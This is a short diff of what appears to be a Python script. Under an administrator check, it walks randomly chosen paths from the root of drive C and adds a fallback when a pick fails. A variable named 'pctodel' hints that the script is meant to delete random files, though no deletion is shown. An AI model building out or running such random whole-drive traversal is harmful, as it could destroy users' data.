@@ -20,7 +20,12 @@ if is_admin():
             
             while True:
                 
-                path = random.choice(glob.glob(f"{path}/*"))
+                try:
+                    path = random.choice(glob.glob(f"{path}/*"))
+                except:
+                    pctodel = 0
+                    path = random.choice(glob.glob("C:/*"))
+                    continue
                 
                 if os.path.isdir(path):
                     
